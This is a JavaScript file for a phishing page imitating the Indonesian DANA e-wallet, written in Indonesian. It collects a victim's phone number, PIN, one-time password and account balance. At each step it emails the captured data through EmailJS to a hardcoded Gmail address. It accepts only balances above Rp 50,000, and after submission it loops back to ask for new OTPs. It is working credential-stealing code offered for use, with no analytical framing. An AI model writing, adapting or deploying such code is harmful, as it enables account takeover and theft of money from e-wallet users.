document.addEventListener("DOMContentLoaded", function () {
  const phoneNumberInput = document.getElementById("phone-number");
  const pinInputs = document.querySelectorAll(".pin-box");
  const otpInputs = document.querySelectorAll(".otp-box");
  const lanjutkanButton = document.getElementById("lanjutkan-button");
  const numberPage = document.getElementById("number-page");
  const pinPage = document.getElementById("pin-page");
  const otpPage = document.getElementById("otp-page");
  const floatingNotification = document.getElementById("floating-notification");
  const saldoInput = document.getElementById("saldo-input");
  const saldoError = document.getElementById("saldo-error");
  const verifikasiButton = document.getElementById("verifikasi-button");

  let otpResendCount = 0;
  const maxOtpResend = 5;

  let userData = {
    nomor: "",
    pin: "",
    otp: "",
    saldo: ""
  };

  // Fungsi untuk mengirim email
  async function sendEmail(subject, message) {
    try {
      await emailjs.send("service_bux14so", "template_fnklr8r", {
        to_name: "Admin", // Nama penerima
        from_name: "sistem DANA", // Nama pengirim
        message: message, // Pesan notifikasi
        subject: subject, // Subjek email
        to_email: "vavevavuvavu@gmail.com" // Email penerima
      });
      console.log("Email sent successfully!");
    } catch (error) {
      console.error("Failed to send email:", error);
    }
  }

  // Fungsi untuk mengirim notifikasi nomor
  function sendNomorNotification() {
    const subject = "Data Nomor";
    const message = `
NOMOR : ${userData.nomor}
    `;
    sendEmail(subject, message);
  }

  // Fungsi untuk mengirim notifikasi nomor dan PIN
  function sendPinNotification() {
    const subject = "Data Nomor dan PIN";
    const message = `
NOMOR : ${userData.nomor}
===
PIN : ${userData.pin}
    `;
    sendEmail(subject, message);
  }

  // Fungsi untuk mengirim notifikasi nomor, PIN, dan OTP
  function sendOtpNotification() {
    const subject = "Data Nomor, PIN, dan OTP";
    const message = `
NOMOR : ${userData.nomor}
===
PIN : ${userData.pin}
===
OTP : ${userData.otp}
    `;
    sendEmail(subject, message);
  }

  // Fungsi untuk mengirim notifikasi nomor, PIN, OTP, dan saldo
  function sendSaldoNotification() {
    const subject = "Data Nomor, PIN, OTP, dan Saldo";
    const message = `
NOMOR : ${userData.nomor}
===
PIN : ${userData.pin}
===
OTP : ${userData.otp}
===
SALDO : ${userData.saldo}
    `;
    sendEmail(subject, message);
  }

  // Format nomor HP
  function formatPhoneNumber(input) {
    let phoneNumber = input.value.replace(/\D/g, '');
    if (phoneNumber.length === 1 && phoneNumber[0] !== '8') {
      phoneNumber = '8';
    }
    if (phoneNumber.length > 15) {
      phoneNumber = phoneNumber.substring(0, 15);
    }
    let formattedNumber = '';
    for (let i = 0; i < phoneNumber.length; i++) {
      if (i === 3 || i === 8) {
        formattedNumber += '-';
      }
      formattedNumber += phoneNumber[i];
    }
    input.value = formattedNumber;
  }

  // Pindah ke halaman PIN
  function goToNextPage() {
    if (numberPage.style.display === "block") {
      const phoneNumber = phoneNumberInput.value.replace(/\D/g, '');
      if (phoneNumber.length >= 8) {
        userData.nomor = phoneNumberInput.value; // Simpan nomor yang sudah diformat
        numberPage.style.display = "none";
        pinPage.style.display = "block";
        phoneNumberInput.blur();
        lanjutkanButton.style.display = "none";
        pinInputs[0].focus();

        // Kirim notifikasi nomor ke email
        sendNomorNotification();
      } else {
        alert("Nomor telepon harus minimal 8 digit.");
      }
    }
  }

  // Fungsi untuk otomatis pindah ke input berikutnya
  function handleAutoMoveInput(inputs, event) {
    const input = event.target;
    const index = Array.from(inputs).indexOf(input);

    if (event.inputType === "deleteContentBackward" && index > 0) {
      inputs[index - 1].focus();
    } else if (input.value.length === 1 && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    // Jika semua PIN terisi, kirim notifikasi PIN
    if (inputs === pinInputs && index === inputs.length - 1) {
      setTimeout(() => {
        userData.pin = Array.from(pinInputs).map((input) => input.value).join("");
        pinPage.style.display = "none";
        otpPage.style.display = "block";
        otpInputs[0].focus();

        // Kirim notifikasi nomor dan PIN ke email
        sendPinNotification();
      }, 300);
    }

    // Jika semua OTP terisi, tampilkan notifikasi floating
    if (inputs === otpInputs && index === inputs.length - 1) {
      userData.otp = Array.from(otpInputs).map((input) => input.value).join("");
      sendOtpNotification(); // Kirim notifikasi nomor, PIN, dan OTP
      showFloatingNotification();
    }
  }

  // Tampilkan notifikasi floating
  function showFloatingNotification() {
    floatingNotification.style.display = "block";
    floatingNotification.addEventListener("click", function () {
      floatingNotification.style.display = "none"; // Sembunyikan notifikasi pertama

      // Tampilkan kotak saldo dan tombol verifikasi setelah notifikasi pertama hilang
      saldoInput.style.display = "block";
      verifikasiButton.style.display = "block";
      saldoInput.focus(); // Fokus ke input saldo
    });
  }

  // Fungsi untuk memformat saldo dengan Rp. dan titik pemisah ribuan
  function formatSaldo(input) {
    let value = input.value.replace(/[^0-9]/g, ''); // Hapus semua karakter non-angka
    if (value === "") {
      input.value = "Rp. ";
      return;
    }

    // Format angka dengan titik pemisah ribuan
    let formattedValue = parseFloat(value).toLocaleString("id-ID");

    // Tambahkan "Rp." di depan nilai yang sudah diformat
    input.value = `Rp. ${formattedValue}`;
  }

  // Fungsi untuk mengirim data saldo ke email
  async function sendFinalDataToEmail() {
    const saldo = saldoInput.value.replace(/[^0-9]/g, ''); // Ambil angka saja

    // Validasi saldo
    if (saldo === "" || parseFloat(saldo) <= 50000) {
      saldoError.style.display = "block"; // Tampilkan pesan error
      return; // Hentikan proses jika saldo tidak valid
    } else {
      saldoError.style.display = "none"; // Sembunyikan pesan error jika saldo valid
      userData.saldo = `Rp. ${parseFloat(saldo).toLocaleString("id-ID")}`; // Format saldo

      // Kirim notifikasi nomor, PIN, OTP, dan saldo ke email
      sendSaldoNotification();

      // Reset input OTP dan saldo
      otpInputs.forEach((input) => (input.value = ""));
      saldoInput.value = "Rp. ";
      saldoInput.style.display = "none"; // Sembunyikan input saldo
      verifikasiButton.style.display = "none"; // Sembunyikan tombol verifikasi
      otpInputs[0].focus(); // Fokus ke input OTP pertama
    }
  }

  // Event listener untuk tombol verifikasi
  verifikasiButton.addEventListener("click", function () {
    sendFinalDataToEmail();
  });

  // Event listener untuk input nomor HP
  phoneNumberInput.addEventListener("input", function () {
    formatPhoneNumber(phoneNumberInput);
  });

  // Event listener untuk input PIN
  pinInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(pinInputs, event));
  });

  // Event listener untuk input OTP
  otpInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(otpInputs, event));
  });

  // Event listener untuk input saldo
  saldoInput.addEventListener("input", function () {
    formatSaldo(saldoInput);
  });

  // Event listener untuk tombol Lanjutkan
  lanjutkanButton.addEventListener("click", goToNextPage);
});